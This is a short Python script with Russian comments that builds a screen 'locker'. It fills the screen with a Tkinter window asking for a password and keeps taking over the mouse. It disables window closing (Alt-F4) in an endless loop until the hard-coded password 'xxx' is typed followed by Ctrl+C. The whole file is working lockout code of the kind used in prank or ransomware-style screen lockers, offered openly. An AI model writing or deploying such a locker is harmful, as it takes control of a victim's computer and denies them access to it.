from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep


def callback(event):
    global k, entry
    if entry.get() == "xxx": k = True


def on_closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    # Отключает сочетание клавиш (Alt-f4) для закрытие программы
    root.protocol("WM_DELETE_WINDOW", on_closing)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)


# ________________________________________________________________________________________
root = Tk()
root.title("Локер")
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=600, y=400)
label_1 = Label(root, text="Запущен локер", font=1)
label_1.grid(row=0, column=0)
label_2 = Label(root, text="Введите пароль и нажмите Ctrl+C", font=20)
label_2.place(x=470, y=300)

root.update()    # |
sleep(0.3)      # <|обновление экрана программы, чтобы нельзя было закрыть его
click(675, 420)  # |
# ________________________________________________________________________________________
k = False  # бесконечный цикл
while k != True: on_closing()
